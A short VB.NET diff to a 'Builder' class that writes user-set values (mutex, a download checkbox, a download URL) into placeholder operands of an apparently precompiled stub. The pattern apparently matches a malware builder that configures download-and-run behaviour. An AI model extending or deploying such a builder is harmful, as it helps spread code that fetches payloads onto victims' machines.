@@ -102,6 +102,12 @@ Public Class Builder
                                             If (str = "%MUTEX%") Then
                                                 current.Operand = TextBox2.Text
                                             End If
+                                            If (str = "%DWCHK%") Then
+                                                current.Operand = DWCHK.Checked.ToString
+                                            End If
+                                            If (str = "%DWURL%") Then
+                                                current.Operand = DWURL.Text
+                                            End If
                                         End If
                                     Loop
                                 Finally
